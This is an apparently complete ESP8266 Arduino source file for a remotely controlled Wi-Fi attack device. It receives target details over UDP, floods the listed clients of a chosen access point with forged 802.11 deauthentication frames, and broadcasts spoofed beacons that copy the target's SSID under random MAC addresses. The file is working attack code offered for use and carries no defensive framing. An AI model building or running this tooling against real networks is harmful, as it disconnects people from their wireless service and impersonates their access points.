
#include <ESP8266WiFi.h>
#include <WiFiUdp.h>

extern "C" {
#include "user_interface.h"
}

#define CL_SIZE     16
#define UDP_PORT    4210
#define DFRAME_LEN  26
#define RBT_DLY     15

//  information about attack
typedef struct
{
    uint8_t         mac[6];             //  MAC address of AP
    char            ssid[33];           //  SSID
    uint8_t         channel;            //  channel
    uint8_t         count_cl;           //  number of connected clients
    uint8_t         client[CL_SIZE][6]; //  clients' mac addresses
    uint8_t         time;
}                   ap_info;

ap_info             access_point;
const char          *ssid = "esp_ap";
const char          *password = "password";

WiFiUDP             Udp;

uint8_t             dframe[CL_SIZE][DFRAME_LEN];

os_timer_t          deauth_term_timer;

void    get_info(void)
{

    size_t len = sizeof(ap_info);
    char packet[len];
    Udp.read(packet, len);
    memcpy(&access_point, &packet, len);

}

void    form_deauth_frames(void)
{

    for (uint8_t i = 0; i < access_point.count_cl; ++i)
    {
        // Type: deauth
        dframe[i][0] = 0xc0;
        dframe[i][1] = 0x00;

        // Duration 0 msec, will be re-written by ESP
        dframe[i][2] = 0x00;
        dframe[i][3] = 0x00;

        // Destination address
        memcpy(&dframe[i][4], access_point.client[i], 6);

        // Sender address
        memcpy(&dframe[i][10], access_point.mac, 6);

        // Transmitter address
        memcpy(&dframe[i][10], access_point.mac, 6);

        // Seq_n
        dframe[i][22] = 0 % 0xff;
        dframe[i][23] = 0 / 0xff;

        // Deauth reason
        dframe[i][24] = 1;
        dframe[i][25] = 0;
    }

}

void    deauth_terminate(void)
{

    memset(&access_point, 0, sizeof(access_point));
    memset(&dframe, 0, sizeof(dframe));

}

void    sendBeacon(const char *ssid)
{

    uint8_t ssid_len = strlen(ssid);

    wifi_set_channel(random(1,12));

    uint8_t packet[83] = {                          //  max len: 38 + 13 + SSID( max = 32) = 83
    0x80, 0x00,                                     //  frame Control 
    0x00, 0x00,                                     //  duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             //  destination address - broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             //  source address - overwritten later
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             //  BSSID - overwritten to the same as the source address
    0xc0, 0x6c,                                     //  seq-ctl
    0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //  timestamp - the number of microseconds the AP has been active
    0xff, 0x00,                                     //  beacon interval
    0x01, 0x04 };                                   //  capability info

    //Source address
    for(uint8_t i = 0; i < 6; ++i)
        packet[i + 10] = packet[i + 16] = random(256);

    packet[36] = 0x00;                              //  element ID (SSID -> 0)
    packet[37] = ssid_len;                          //  field length
    memcpy(&packet[38], ssid, ssid_len);            //  SSID

    uint8_t postSSID[13] = {
    0x01,                                           //  element ID (supported rates -> 1)
    0x08,                                           //  field length
    0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //  supported rates
    0x03,                                           //  element ID (DS Parameter Set -> 3)
    0x01,                                           //  field length
    0x00 };                                         //  channel - overwritten later

    postSSID[12] = access_point.channel;

    memcpy(&packet[38 + ssid_len], &postSSID, 13);

    uint8_t packetSize = 51 + ssid_len;

    for(uint8_t i = 0; i < 10; ++i)
    {
        wifi_send_pkt_freedom(packet, packetSize, 0);
        delay(1);
    }

}

void    setup()
{

    Serial.begin(115200);

    uint8_t    mac[6];
    wifi_get_macaddr(STATION_IF, mac);
    memset(&mac, 0, 3);
    wifi_set_macaddr(STATION_IF, mac);

    Serial.printf("\n\nMAC: %02x:%02x:%02x:%02x:%02x:%02x\n", MAC2STR(mac));

    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid, password);

    Serial.printf("Connecting to %s", ssid);
    while (WiFi.status() != WL_CONNECTED)
    {
        delay(500);
        Serial.print(".");
    }
    Serial.print("connected\n");

    Udp.begin(UDP_PORT);
    Serial.printf("Now listening at IP %s, UDP port %d\n\n", WiFi.localIP().toString().c_str(), UDP_PORT);

}

void    loop()
{

    int    packetSize = Udp.parsePacket();
    if (packetSize)
    {
        Serial.printf("Received %d bytes from %s, port %d\n", packetSize, Udp.remoteIP().toString().c_str(), Udp.remotePort());
        
        deauth_terminate();
        get_info();
        form_deauth_frames();

        Serial.print("access point for attack:\n");
        Serial.printf("\tSSID:    %s\n", access_point.ssid);
        Serial.printf("\tMAC:     %02x:%02x:%02x:%02x:%02x:%02x\n", MAC2STR(access_point.mac));
        Serial.printf("\tchannel: %d\n", access_point.channel);
        Serial.printf("\ttime:    %d\n\n", access_point.time);
        for(uint8_t i = 0; i < access_point.count_cl; ++i)
            Serial.printf("\tclient(%2d): %02x:%02x:%02x:%02x:%02x:%02x\n", i + 1, MAC2STR(access_point.client[i]));

        os_timer_disarm(&deauth_term_timer);
        os_timer_setfn(&deauth_term_timer, (os_timer_func_t *)deauth_terminate, (void *)0);
        os_timer_arm(&deauth_term_timer, access_point.time * 1000, 0);

        Serial.print("deauth started\n");

    }

    if (access_point.count_cl)
    {
        for (int j = 0; j < 100; ++j)
        {
            wifi_set_channel(access_point.channel);
            for (int i = 0; i < access_point.count_cl; ++i)
            {
                wifi_send_pkt_freedom(dframe[i], DFRAME_LEN, 0);
                delay(1);
            }
            sendBeacon(access_point.ssid);
        }
    }

    if ((WiFi.status() == WL_CONNECTION_LOST || WiFi.status() == WL_DISCONNECTED) && !access_point.count_cl)
    {
        Serial.printf("disconnected, reboot in %d seconds\n", RBT_DLY);
        delay(RBT_DLY * 1000);
        ESP.restart();
    }

}
